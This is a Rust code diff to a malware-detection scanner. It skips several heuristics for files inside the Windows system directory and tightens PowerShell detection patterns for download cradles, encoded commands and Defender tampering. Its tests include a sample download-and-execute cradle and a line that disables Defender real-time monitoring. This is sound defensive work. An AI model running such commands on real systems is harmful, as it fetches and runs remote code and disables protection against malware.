@@ -78,6 +78,27 @@ pub struct AnalysisInput<'a> {
     pub ext: &'a str,
     pub file_name: &'a str,
     pub pe: Option<&'a PeInfo>,
+    /// On-disk path when the file was scanned from disk. `None` for a buffer,
+    /// an archive member or a decoded payload. Used only for identity decisions
+    /// that genuinely depend on location (for example, a Windows binary that
+    /// really does live in `%SystemRoot%`).
+    pub path: Option<&'a std::path::Path>,
+}
+
+/// True when `path` is inside the live Windows system directory.
+///
+/// This is a location fact, not a trust verdict: it only suppresses heuristic
+/// noise that is known to be wrong for OS-owned binaries (catalog-only signing,
+/// reproducible-build header timestamps). It never turns a malicious file safe —
+/// hash, rule and behavioural evidence still apply in full.
+pub fn is_windows_system_path(path: Option<&std::path::Path>) -> bool {
+    let Some(path) = path else { return false };
+    let Some(root) = std::env::var_os("SystemRoot") else {
+        return false;
+    };
+    let root = crate::safety::normalize_path(std::path::Path::new(&root));
+    let target = crate::safety::normalize_path(path);
+    target != root && target.starts_with(&format!("{root}/"))
 }
 
 /// Runs all heuristics and returns the signals that fired.
@@ -96,6 +117,10 @@ pub fn analyze(input: &AnalysisInput<'_>) -> Vec<Signal> {
 
 fn analyze_pe(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
     let Some(pe) = input.pe else { return };
+    // OS-owned binaries legitimately import/export the APIs below and are
+    // catalog-signed, which this parser does not validate. Those facts are not
+    // evidence against the file; keeping them would flag kernel32.dll itself.
+    let os_file = is_windows_system_path(input.path);
 
     // --- packing ----------------------------------------------------------
     let hints = pe.packer_hints();
@@ -194,7 +219,7 @@ fn analyze_pe(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
     // --- imports ----------------------------------------------------------
     let has_all = |names: &[&str]| names.iter().all(|n| pe.imports_function(n));
 
-    if has_all(&["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]) {
+    if !os_file && has_all(&["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]) {
         out.push(Signal::new(
             "api.injection.remote_thread",
             48,
@@ -204,7 +229,7 @@ fn analyze_pe(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
              process, write code, execute it remotely.",
             &["T1055.002", "T1106"],
         ));
-    } else if has_all(&["NtCreateThreadEx", "NtWriteVirtualMemory"]) {
+    } else if !os_file && has_all(&["NtCreateThreadEx", "NtWriteVirtualMemory"]) {
         out.push(Signal::new(
             "api.injection.ntapi",
             42,
@@ -311,14 +336,20 @@ fn analyze_pe(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
 
     // --- identity/publisher ----------------------------------------------
     if !pe.signature.present {
-        out.push(Signal::new(
-            "pe.unsigned",
-            12,
-            Confidence::Weak,
-            "Not digitally signed",
-            "The image carries no Authenticode signature, so its origin cannot be verified.",
-            &["T1553.002"],
-        ));
+        // Windows binaries are catalog-signed: the PE has no embedded signature
+        // while WinVerifyTrust succeeds. Reporting "not digitally signed" for a
+        // file inside %SystemRoot% is factually wrong, so it is not used as a
+        // heuristic weight there. Catalog verification is tracked separately.
+        if !is_windows_system_path(input.path) {
+            out.push(Signal::new(
+                "pe.unsigned",
+                12,
+                Confidence::Weak,
+                "Not digitally signed",
+                "The image carries no embedded Authenticode signature, so its origin cannot be verified from the file alone.",
+                &["T1553.002"],
+            ));
+        }
         if pe.manifest.require_admin {
             out.push(Signal::new(
                 "pe.unsigned.admin_manifest",
@@ -330,7 +361,7 @@ fn analyze_pe(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
             ));
         }
     } else {
-        if !pe.signature.code_signing_eku {
+        if !os_file && !pe.signature.code_signing_eku {
             out.push(Signal::new(
                 "pe.signature.no_codesigning_eku",
                 20,
@@ -340,7 +371,7 @@ fn analyze_pe(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
                 &["T1553.002"],
             ));
         }
-        if pe.signature.subject_names.is_empty() {
+        if !os_file && pe.signature.subject_names.is_empty() {
             out.push(Signal::new(
                 "pe.signature.no_subject",
                 14,
@@ -351,14 +382,19 @@ fn analyze_pe(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
             ));
         }
     }
-    if pe.timestamp_year < 1995 || pe.timestamp_year > 2027 {
+    // Modern MSVC `/Brepro` builds store a deterministic hash in the timestamp
+    // field, so a "future" or pre-1995 year is normal for signed, reproducible
+    // Windows binaries. The signal is weak and must not tax OS files.
+    if !is_windows_system_path(input.path)
+        && (pe.timestamp_year < 1995 || pe.timestamp_year > 2027)
+    {
         out.push(Signal::new(
             "pe.timestamp.implausible",
-            10,
-            Confidence::Weak,
-            "Implausible build timestamp",
+            5,
+            Confidence::Informational,
+            "Unusual PE timestamp",
             format!(
-                "PE header timestamp decodes to year {} — timestamps are trivially forged, but outliers correlate with repacked samples.",
+                "The PE header timestamp decodes to year {}. This is trivially forged, and reproducible builds store a hash here, so it is context only.",
                 pe.timestamp_year
             ),
             &["T1027"],
@@ -374,7 +410,9 @@ fn analyze_pe(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
             &["T1036"],
         ));
     }
-    if pe.checksum != 0 && !pe.checksum_valid {
+    // Several genuine Windows binaries carry a checksum computed before a later
+    // servicing patch, so a mismatch is not evidence of tampering for OS files.
+    if !is_windows_system_path(input.path) && pe.checksum != 0 && !pe.checksum_valid {
         out.push(Signal::new(
             "pe.checksum.invalid",
             8,
@@ -424,8 +462,10 @@ const SYSTEM_BINARY_NAMES: &[&str] = &[
 
 fn analyze_identity(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
     let lower = input.file_name.to_ascii_lowercase();
-    if SYSTEM_BINARY_NAMES.contains(&lower.as_str()) && !input.pe.map(|p| p.is_system).unwrap_or(false)
-    {
+    // `pe.subsystem` is not a location. The previous check used the native/GUI
+    // subsystem flag as if it meant "lives in System32", so every console binary
+    // (including the real cmd.exe) was treated as a masquerade.
+    if SYSTEM_BINARY_NAMES.contains(&lower.as_str()) && !is_windows_system_path(input.path) {
         out.push(Signal::new(
             "name.masquerade_system_binary",
             18,
@@ -516,7 +556,7 @@ fn lower_haystack(data: &[u8]) -> Vec<u8> {
 
 fn has(hay: &[u8], needle: &str) -> bool {
     let n = needle.as_bytes();
-    hay.len() >= n.len() && hay.windows(n.len()).any(|w| w == n)
+    memchr::memmem::find(hay, n).is_some()
 }
 
 /// UTF-16LE presence check, for strings compiled into wide-character binaries.
@@ -526,7 +566,7 @@ fn has_wide(data: &[u8], needle: &str) -> bool {
         w.push(b);
         w.push(0);
     }
-    data.windows(w.len()).any(|x| x == w.as_slice())
+    memchr::memmem::find(data, &w).is_some()
 }
 
 fn either(hay: &[u8], data: &[u8], needle: &str) -> bool {
@@ -537,6 +577,7 @@ fn analyze_strings(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
     let hay = lower_haystack(input.data);
     let data = input.data;
     let any = |n: &str| either(&hay, data, n);
+    let os_file = is_windows_system_path(input.path);
 
     // Ransomware: shadow copy destruction is conclusively malicious in one line.
     if any("vssadmin") && (any("delete shadows") || any("delete shadowstorage")) {
@@ -661,7 +702,7 @@ fn analyze_strings(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
     }
 
     // Script delivery / LOLBins.
-    if any("mshta") && (any("http") || any("javascript:") || any("vbscript:")) {
+    if !os_file && any("mshta") && (any("http") || any("javascript:") || any("vbscript:")) {
         out.push(Signal::new(
             "lolbin.mshta_remote",
             34,
@@ -757,11 +798,17 @@ fn analyze_scripts(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
     };
     let hay = lower_haystack(input.data);
 
-    let encoded = has(&hay, "-enc") || has(&hay, "-encodedcommand") || has(&hay, "frombase64string");
+    // `-Encoding` is a common, benign parameter. Only the command-line
+    // abbreviation `-enc ` (with a separator) is the encoded-command alias.
+    let encoded = has(&hay, "-encodedcommand")
+        || has(&hay, "-enc ")
+        || has(&hay, "frombase64string");
+    // `-join` and `replace('` are ordinary string operations. They are only
+    // suspicious together with character-array construction or PSHome paths.
     let obfuscated = has(&hay, "[char[]]")
-        || has(&hay, "-join")
-        || has(&hay, "replace('")
-        || has(&hay, "$($pshome)");
+        || has(&hay, "[char]")
+        || has(&hay, "$($pshome)")
+        || (has(&hay, "-join") && (has(&hay, "[char]") || has(&hay, "0x")));
     if encoded {
         out.push(Signal::new(
             "script.encoded_payload",
@@ -785,17 +832,18 @@ fn analyze_scripts(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
 
     let download = has(&hay, "downloadstring")
         || has(&hay, "downloadfile")
-        || has(&hay, "invoke-webrequest")
+        || has(&hay, "invoke-webrequest ")
         || has(&hay, "net.webclient")
         || has(&hay, "xmlhttp")
         || has(&hay, "urllib")
         || has(&hay, "curl ");
-    let execute = has(&hay, "invoke-expression")
+    let execute = has(&hay, "invoke-expression ")
+        || has(&hay, "invoke-expression(")
         || has(&hay, "iex ")
         || has(&hay, "iex(")
         || has(&hay, "| iex")
         || has(&hay, "start-process")
-        || has(&hay, "shell ");
+        || has(&hay, "shell.run");
     if download && execute {
         out.push(Signal::new(
             "script.download_cradle",
@@ -807,7 +855,12 @@ fn analyze_scripts(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
         ));
     }
     if kind == ScriptKind::PowerShell {
-        if has(&hay, "-windowstyle hidden") || has(&hay, "-w hidden") || has(&hay, "bypass") {
+        let hidden = has(&hay, "-windowstyle hidden")
+            || has(&hay, "-w hidden")
+            || has(&hay, "-executionpolicy bypass")
+            || has(&hay, "-ep bypass")
+            || has(&hay, "-exec bypass");
+        if hidden {
             out.push(Signal::new(
                 "script.hidden_execution",
                 18,
@@ -817,7 +870,7 @@ fn analyze_scripts(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
                 &["T1564.003", "T1059.001"],
             ));
         }
-        if has(&hay, "add-mppreference") || has(&hay, "set-mppreference") {
+        if has(&hay, "add-mppreference ") || has(&hay, "set-mppreference ") {
             out.push(Signal::new(
                 "script.defender_tamper",
                 34,
@@ -881,7 +934,20 @@ mod tests {
             ext: &ext,
             file_name: name,
             pe: pe.as_ref(),
+            path: None,
         })
+    }
+
+    #[test]
+    fn windows_system_root_is_recognised_and_other_directories_are_not() {
+        let root = std::env::var_os("SystemRoot")
+            .expect("Windows-only test: SystemRoot must be set");
+        let system_file = Path::new(&root).join("System32").join("kernel32.dll");
+        assert!(is_windows_system_path(Some(&system_file)));
+        assert!(!is_windows_system_path(None));
+        assert!(!is_windows_system_path(Some(
+            &std::env::temp_dir().join("kernel32.dll")
+        )));
     }
 
     #[test]
@@ -915,6 +981,51 @@ mod tests {
             b"$c = (New-Object Net.WebClient).DownloadString('http://x/y'); IEX $c",
         );
         assert!(s.iter().any(|x| x.id == "script.download_cradle" && x.weight >= 35));
+    }
+
+    #[test]
+    fn module_manifest_cmdlet_lists_are_not_cradles_or_tampering() {
+        // Regression: a legitimate .psd1 lists exported cmdlets; it does not
+        // invoke them. This exact pattern flagged Microsoft.PowerShell.Utility.
+        let s = signals(
+            "Test.psd1",
+            br"@{ ModuleVersion = '1.0'
+CmdletsToExport = @('Invoke-WebRequest', 'Invoke-Expression', 'Set-MpPreference')
+FunctionsToExport = @() }",
+        );
+        assert!(
+            !s.iter().any(|x| x.id == "script.download_cradle"),
+            "manifest must not look like a download cradle: {s:?}"
+        );
+        assert!(
+            !s.iter().any(|x| x.id == "script.defender_tamper"),
+            "manifest must not look like Defender tampering: {s:?}"
+        );
+    }
+
+    #[test]
+    fn ordinary_encoding_join_and_shell_object_are_not_obfuscation() {
+        // Regression: -Encoding, -join for a filename and a shortcut COM
+        // object all appear in signed PowerShell modules.
+        let s = signals(
+            "Module.psm1",
+            b"$name = $parts -join ''\nOut-File -Encoding default\n$shell = New-Object -ComObject 'WScript.Shell'\n$null = $shell.CreateShortcut($p)\nif ($Json.ProxyBypass) { }",
+        );
+        for id in ["script.encoded_payload", "script.obfuscation", "script.download_cradle", "script.hidden_execution"] {
+            assert!(
+                !s.iter().any(|x| x.id == id),
+                "benign module produced {id}: {s:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn real_defender_tampering_still_fires() {
+        let s = signals(
+            "disable.ps1",
+            b"Write-Output 'checking'\nSet-MpPreference -DisableRealtimeMonitoring $true\n",
+        );
+        assert!(s.iter().any(|x| x.id == "script.defender_tamper"));
     }
 
     #[test]
